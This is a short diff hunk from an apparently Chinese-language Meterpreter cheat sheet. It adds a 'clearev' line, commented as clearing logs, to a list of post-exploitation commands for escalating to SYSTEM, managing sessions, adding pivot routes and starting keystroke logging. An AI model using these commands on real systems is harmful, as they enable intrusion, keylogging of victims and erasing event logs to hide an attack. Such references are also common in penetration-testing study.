@@ -8,6 +8,7 @@ getsystem –h        #升级权限SYSTEM账户
 background          #返回，把meterpreter后台挂起
 sessions -i number  # 与会话进行交互
 route               #查看或修改受害者路由表
+clearev             #清除日志
 run autoroute -s 10.1.1.6/255.0.0.0 #添加路由表
 
 keyscan_start       #开启键盘记录功能
